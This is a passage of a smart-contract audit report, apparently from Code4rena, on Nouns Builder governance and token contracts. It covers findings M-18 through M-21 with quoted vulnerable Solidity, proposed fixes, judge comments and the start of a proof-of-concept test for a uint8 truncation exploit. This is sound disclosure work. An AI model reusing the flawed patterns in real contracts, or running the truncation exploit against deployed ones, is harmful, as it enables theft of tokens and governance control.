href=\"#m-18-precision-is-not-enough-for-proposalthreshold-and-quorum-collections-with-at-least-20000-nfts-in-total-supply-may-have-some-trouble\" aria-label=\"m 18 precision is not enough for proposalthreshold and quorum collections with at least 20000 nfts in total supply may have some trouble permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/335\">[M-18] Precision is not enough for <code>proposalThreshold</code> and quorum. Collections with at least 20000 NFTs in total supply may have some trouble.</a></h2>\n<p><em>Submitted by Chom</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L465-L477\">Governor.sol#L465-L477</a><br></p>\n<p>Precision is not enough for proposalThreshold and quorum. Collections with at least 20000 NFTs in total supply may have some trouble. These collections can’t be set proposalThreshold = 1 or quorum = 1.</p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice The current number of votes required to submit a proposal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function proposalThreshold() public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return (settings.token.totalSupply() * settings.proposalThresholdBps) / 10_000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice The current number of votes required to be in favor of a proposal in order to reach quorum</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function quorum() public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>If totalSupply = 20000, with the lowest settings (settings.proposalThresholdBps, settings.quorumThresholdBps = 1), it would returns (20000 * 1) / 10000 = 2. And it can’t be lowered more.</p>\n<h3 id=\"recommended-mitigation-steps-22\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-22\" aria-label=\"recommended mitigation steps 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Increase division to a more precise value such as 1e18 to allow high total supply NFT to always set threshold as 1</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice The current number of votes required to submit a proposal</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function proposalThreshold() public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return (settings.token.totalSupply() * settings.proposalThresholdBps) / 1e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /// @notice The current number of votes required to be in favor of a proposal in order to reach quorum</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function quorum() public view returns (uint256) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            return (settings.token.totalSupply() * settings.quorumThresholdBps) / 1e18;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/335#issuecomment-1258038607\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While I think more could have been said, this report quantifies how the quorum math can be rounded down to zero.</p>\n<p>Because the math is used to manage value, and allowances, I agree with Medium Severity.</p>\n<p>I recommend end users to Fuzz Test the settings to visualize a rational quorum that prevents it from being too low.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/335\">kulkarohan (Nouns Builder) acknowledged</a></strong></p>\n<hr>\n<h2 id=\"m-19-governor---quorum-could-be-less-than-intended\" style=\"position:relative;\"><a href=\"#m-19-governor---quorum-could-be-less-than-intended\" aria-label=\"m 19 governor   quorum could be less than intended permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/195\">[M-19] <code>Governor</code> - Quorum could be less than intended</a></h2>\n<p><em>Submitted by Picodes, also found by CertoraInc and Chom</em></p>\n<p>There could be tokens minted between the <code>quorum</code> computation and the vote, which would lead to a quorum lower than intended. It could be an issue at the beginning of the <code>Token</code> lifecycle, when the total supply is still low.</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When creating a proposal in the <code>Governor</code> contract, <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L168\"><code>proposal.quorumVotes</code></a> is computed during the <code>propose</code> tx. However tokens could be minted after the <code>propose</code> in the same block. In this case, they’ll still have a vote during the proposal due to how <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462\"><code>token.getPastVotes</code></a> works, therefore the quorum will be lower than intended given the actual total supply.</p>\n<h3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Either compute the total supply afterwards, for example at the beginning of the vote, either takes the vote with a timestamp of <code>proposal.timeCreated</code> - 1 to not count the block during which the tx was submitted.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/195#issuecomment-1258043036\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how the quorum value can be manipulated because instead of checking for the totalSupply at time of creation, the Governor checks for a totalSupply that can change.</p>\n<p>This is tied to the burning mechanism, so a refactor of both would be necessary.</p>\n<p>Alternatively this could be a nofix, however admins and end users should be aware that the Quorum math will be inconsistent due to that check.</p>\n<p>Because the quorum is tied to actions that can cause a leak of value or theft, I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/195#issuecomment-1258472285\">tbtstl (Nouns Builder) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>ACK on this confusion – but this is the current behaviour of both Nouns and Lil Nouns, so I’d say it is intentional for now – we may want to adjust this in a future upgrade.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-20-attackers-can-increase-voting-power-by-incentivizing\" style=\"position:relative;\"><a href=\"#m-20-attackers-can-increase-voting-power-by-incentivizing\" aria-label=\"m 20 attackers can increase voting power by incentivizing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479\">[M-20] Attackers can increase voting power by incentivizing</a></h2>\n<p><em>Submitted by Tomo</em></p>\n<p>If the benefit to be gained from the outcome of the vote is less than the cost of obtaining the right to vote, the outcome of the vote is influenced.</p>\n<h3 id=\"proof-of-concept-21\" style=\"position:relative;\"><a href=\"#proof-of-concept-21\" aria-label=\"proof of concept 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L248-L297\">Governor.sol#L248-L297</a><br></li>\n<li><a href=\"https://finematics.com/vampire-attack-sushiswap-explained\">Vampire Attack Explained</a><br></li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Add blacklist check for <code>_castVote</code> function.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk11\">isBlacklisted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">BLACKLISTED</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<ul>\n<li>Create a function to delete the voting power and add the address to the blacklist.</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">addBlackList</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blackList</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">isBlackListed</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_blackList</span><span class=\"mtk1\">] = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Blacklisted</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_blackList</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deleteVotingPower</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_blackListed</span><span class=\"mtk1\">,</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_support</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_support</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">INVALID_VOTE</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">hasVoted</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_proposalId</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_blackListed</span><span class=\"mtk1\">],</span><span class=\"mtk8\">&quot;NO VOTING BY BLACKLISTED&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_support</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">againstVotes</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_support</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">1</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_support</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">2</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk3\">// Update the total number of votes abstaining</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">abstainVotes</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">_weight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"similar-issue\" style=\"position:relative;\"><a href=\"#similar-issue\" aria-label=\"similar issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Similar Issue</h3>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-05-aura-findings/issues/278\">https://github.com/code-423n4/2022-05-aura-findings/issues/278</a></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1251423298\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Nice idea, not sure if there’s any way to avoid this.</p>\n<p>Allowlist would cause centralization issue, and would be defeated by the bribes as well.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1258368976\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>While I think the finding can be further developed. I have to concede that via bribes and incentives, governance can be skewed to act against the interest of the founders.</p>\n<p>Whether this is good or bad per see, is not that relevant, however the system does allow delegation to a “malicious party” which would be able to obtain enough votes to do whatever they want.</p>\n<p>Notice that the veto system prevents this as well, so we could argue that removing Vetoing allows this, which is effectively another take on a 51% attack.</p>\n<p>Leaving as unique for the thought-provoking idea.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1261504746\">kulkarohan (Nouns Builder) disputed and commented</a>:</strong></p>\n<blockquote>\n<p>This is why veto power is granted to founders. Not an issue IMO and would introduce needless complexity + centralization going the blacklist route.  </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/479#issuecomment-1265707141\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per the discussion above, taking into consideration that CodeArena is a end-user facing project, meaning our reports could be used to determine if a project is safe or not;</p>\n<p>Given the recent example of large scale bribes to <a href=\"https://tribe.fei.money/t/fully-repay-fuse-bad-debt/4528\">influence a voting outcome</a></p>\n<p>While disagreeing as well with the solution of offering a Blocklist to prevent malicious actor, and agreeing that the finding should have been better written.</p>\n<p>I have to rationally concede that the ability to bribe governance can be used to extract value from the Treasury, a Vetoer may or may not offer protection at that time due to second order social consequences.</p>\n<p>Because of that, given the rules (Loss of Value conditional on externalities), given the precedents (one linked above, I’m sure there’s many other), I still believe that this is a valid Medium Severity finding.</p>\n<p>Per the comment by the sponsor, a properly aligned Vetoer will be able to prevent most of these attacks, however I don’t think that’s sufficient to make the finding invalid.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-21-truncation-in-casting-can-lead-to-a-founder-receiving-all-the-base-tokens\" style=\"position:relative;\"><a href=\"#m-21-truncation-in-casting-can-lead-to-a-founder-receiving-all-the-base-tokens\" aria-label=\"m 21 truncation in casting can lead to a founder receiving all the base tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303\">[M-21] Truncation in casting can lead to a founder receiving all the base tokens</a></h2>\n<p><em>Submitted by CertoraInc, also found by 0xSky, antonttc, bin2chen, izhuer, pcarranzav, peritoflores, PwnPatrol, rbserver, scaraven, Tomo, V_B, wagmi, and zzzitron</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L71-L126\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L71-L126</a><br>\n<a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88\">https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88</a></p>\n<p>The initialize function of the <code>Token</code> contract receives an array of <code>FounderParams</code>, which contains the ownership percent of each founder as a <code>uint256</code>. The initialize function checks that the sum of the percents is not more than 100, but the value that is added to the sum of the percent is truncated to fit in <code>uint8</code>. This leads to an error because the value that is used for assigning the base tokens is the original, not truncated, <code>uint256</code> value.</p>\n<p>This can lead to wrong assignment of the base tokens, and can also lead to a situation where not all the users will get the correct share of base tokens (if any).</p>\n<h3 id=\"proof-of-concept-22\" style=\"position:relative;\"><a href=\"#proof-of-concept-22\" aria-label=\"proof of concept 22 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>To verify this bug I created a foundry test. You can add it to the test folder and run it with <code>forge test --match-test testFounderGettingAllBaseTokensBug</code>.</p>\n<p>This test deploys a token implementation and an <code>ERC1967</code> proxy that points to it, and initializes the proxy using an array of 2 founders, each having 256 ownership percent. The value which is added to the <code>totalOwnership</code> variable is a <code>uint8</code>, and when truncating 256 to fit in a <code>uint8</code> it will turn to 0, so this check will pass.</p>\n<p>After the call to initialize, the test asserts that all the base token ids belongs to the first founder, which means the second founder didn’t get any base tokens at all.</p>\n<p>What actually happens here is that the first founder gets the first 256 token ids, and the second founder gets the next 256 token ids, but because the base token is calculated % 100, only the first 100 matters and they will be owned by the first owner.</p>\n<p>This happens because <code>schedule</code>, which is equal to <code>100 / founderPct</code>, will be zero (<code>100 / 256 == 0</code> due to uint div operation), and the base token id won’t be updated in <code>(baseTokenId += schedule) % 100</code> (this line contains another mistake, which will be reported in another finding). The place where it will be updated is in the <code>_getNextTokenId</code>, where it will be incremented by 1.</p>\n<p>This exploit can work as long as the sum of the percents modulo 256 (truncation to <code>uint8</code>) is not more than 100.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"sol\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// The relative path of this file is &quot;test/FounderGettingAllBaseTokensBug.t.sol&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: 